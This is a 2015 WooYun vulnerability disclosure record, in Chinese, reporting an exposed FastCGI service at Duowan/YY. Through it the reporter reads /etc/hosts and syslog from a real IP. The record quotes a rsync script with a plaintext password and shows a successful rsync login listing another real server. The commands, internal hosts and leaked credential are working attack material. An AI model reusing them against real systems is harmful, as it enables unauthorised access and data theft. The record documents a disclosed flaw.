{"id": 46936, "wybug_id": "wooyun-2015-095629", "wybug_title": "多玩YY某服务配置不当可读任意文件(连带多个rsync服务器可控制)", "wybug_corp": "广州多玩", "wybug_author": "boooooom", "wybug_date": "2015-02-04 16:00", "wybug_open_date": "2015-02-09 16:02", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-09：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT 详细说明：  依然是fastcgi的问题，222.134.66.98这个ip\n[root@localhost fastcgi]$ /usr/local/php/bin/php fcgiget.php 222.134.66.98:9000/etc/hostsX-Powered-By: PHP/5.2.6-3ubuntu4.6Content-type: text/html127.0.0.1\tlocalhost222.134.66.98\tubuntu# The following lines are desirable for IPv6 capable hosts::1     localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allroutersff02::3 ip6-allhosts58.249.119.209  smproxy1.yy.duowan.com112.65.241.7  smproxy2.yy.duowan.com59.151.23.85  smproxy3.yy.duowan.com106.38.198.9 manager.repos.yy.duowan.com118.26.226.207\tsdaemon.yy.duowan.com58.249.119.217\tsdaemon2.yy.duowan.com58.248.187.58\tyycookie.yy.duowan.com58.249.119.217\trdaemon.yy.duowan.com118.26.226.207\trdaemon2.yy.duowan.com58.249.119.217\trelayDaemon.yy.duowan.com118.26.226.207\trelayDaemon2.yy.duowan.com58.249.119.211 balance.yy.duowan.com221.228.79.31\tbc.yy.duowan.com221.228.79.32\tbc2.yy.duowan.com121.14.37.153\tconfig.yy.duowan.com58.215.46.21\tmirror.yy.duowan.com121.14.43.142\toams.yy.duowan.com106.38.255.130\toams2.yy.duowan.com\n读下syslog看看\n[root@localhost fastcgi]$ /usr/local/php/bin/php fcgiget.php 222.134.66.98:9000/var/log/syslog|grep rsyncFeb  4 05:30:01 ubuntu /USR/SBIN/CRON[7100]: (root) CMD (/bin/bash /home/dspeak/rsync_jifen.sh)Feb  4 05:30:01 ubuntu /USR/SBIN/CRON[7102]: (root) CMD (/bin/bash /home/dspeak/check_rsync_jifen.sh)Feb  4 05:40:01 ubuntu /USR/SBIN/CRON[19136]: (root) CMD (rsync -avzP /data/yy/log/STATLOG/*.gz sys_log@222.88.95.237::sys_log/222_134_66_98 --password-file=/data/yy/log/STATLOG/pass.scr)Feb  4 06:00:01 ubuntu /USR/SBIN/CRON[7887]: (root) CMD (/bin/bash /home/dspeak/rsync_jifen.sh)Feb  4 06:00:01 ubuntu /USR/SBIN/CRON[7892]: (root) CMD (/bin/bash /home/dspeak/check_rsync_jifen.sh)Feb  4 06:30:01 ubuntu /USR/SBIN/CRON[11029]: (root) CMD (/bin/bash /home/dspeak/rsync_jifen.sh)Feb  4 06:30:01 ubuntu /USR/SBIN/CRON[11034]: (root) CMD (/bin/bash /home/dspeak/check_rsync_jifen.sh)Feb  4 07:00:01 ubuntu /USR/SBIN/CRON[11999]: (root) CMD (/bin/bash /home/dspeak/check_rsync_jifen.sh)Feb  4 07:00:01 ubuntu /USR/SBIN/CRON[12004]: (root) CMD (/bin/bash /home/dspeak/rsync_jifen.sh)\n这个文件/home/dspeak/rsync_jifen.sh\nif [ \"$ispType\" = \"5\" ] ; then\t    # CNC               rsyncServerList=\"58.249.117.105  122.13.149.246  111.206.234.120\"   else\t    # OTHER ISP             rsyncServerList=\"121.14.39.137  121.14.43.217  106.38.255.155\"   fi....     \tfor file in $syncList ; do                 flag=0                 for rsyncServer in $rsyncServerList ; do               \t\t  rsync -az --password-file=/etc/rsync.scr $file jifen@${rsyncServer}::jifen/$ip/ ; rc=$?         \t\t           \t\t  if [ $rc -eq 0 ] ; then         \t\t \t                        info_short_log \"sync file [$file] to [$rsyncServer] succeed , rc=[$rc]\"         \t\t  else                       err_short_log \"sync file [$file] to [$rsyncServer] failed , rc=[$rc]\"                  fi                  \t\t  ((flag+=$rc))            done\n然后某个文件里面有这个密码，具体哪个我忘记了，对不起\necho 1qazxcv > /etc/rsync.scr\t\tchmod 600 /etc/rsync.scr    else        if [ ! -s /etc/rsync.scr ];then            echo 1qazxcv > /etc/rsync.scr            chmod 600 /etc/rsync.scr        fi\n   漏洞证明：  不知道内容是啥，看不懂\n[root@localhost fastcgi]$ rsync jifen@58.249.117.105::jifen |morePassword: drwxr-xr-x      102400 2015/02/03 14:00:13 .drwxr-xr-x       36864 2015/02/04 15:00:06 101.226.185.140drwxr-xr-x       32768 2015/02/04 15:30:14 101.226.185.145drwxr-xr-x       49152 2015/02/04 15:30:04 101.226.185.39drwxr-xr-x       53248 2015/02/04 15:30:06 101.226.185.40drwxr-xr-x       36864 2015/02/04 15:30:08 101.226.185.41drwxr-xr-x       36864 2015/02/04 15:30:03 101.226.185.44drwxr-xr-x       28672 2015/02/04 15:30:01 101.226.185.45drwxr-xr-x       36864 2015/02/04 15:30:02 101.226.185.46drwxr-xr-x       36864 2015/02/04 15:30:04 101.226.185.47drwxr-xr-x       36864 2015/02/04 15:30:02 101.226.185.48drwxr-xr-x       36864 2015/02/04 15:30:08 101.226.185.49drwxr-xr-x       36864 2015/02/04 15:30:02 101.226.185.50drwxr-xr-x       36864 2015/02/04 15:30:18 101.226.185.51drwxr-xr-x       36864 2015/02/04 15:30:03 101.226.185.52drwxr-xr-x       36864 2015/02/04 15:30:04 101.226.185.53drwxr-xr-x       36864 2015/02/04 15:30:09 101.226.185.54drwxr-xr-x       36864 2015/02/04 15:30:03 101.226.185.55drwxr-xr-x       32768 2015/02/04 15:30:02 101.226.185.59drwxr-xr-x       36864 2015/02/04 15:30:07 101.226.185.60drwxr-xr-x       36864 2015/02/04 15:30:06 101.226.185.61drwxr-xr-x       36864 2015/02/04 15:30:02 101.226.185.62drwxr-xr-x        4096 2015/02/04 14:30:02 101.4.56.118drwxr-xr-x        4096 2015/02/04 14:30:06 101.4.56.84drwxr-xr-x        4096 2015/02/04 15:00:02 101.4.56.85drwxr-xr-x        4096 2015/02/04 14:30:02 101.4.56.86\n   修复方案：  访问控制   版权声明：转载请注明来源 boooooom@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-02-09 16:02 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-04 17:22 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  提醒了我两次    \n     2015-02-04 17:28 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  @猪猪侠 有人捣乱，猜猜是谁    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}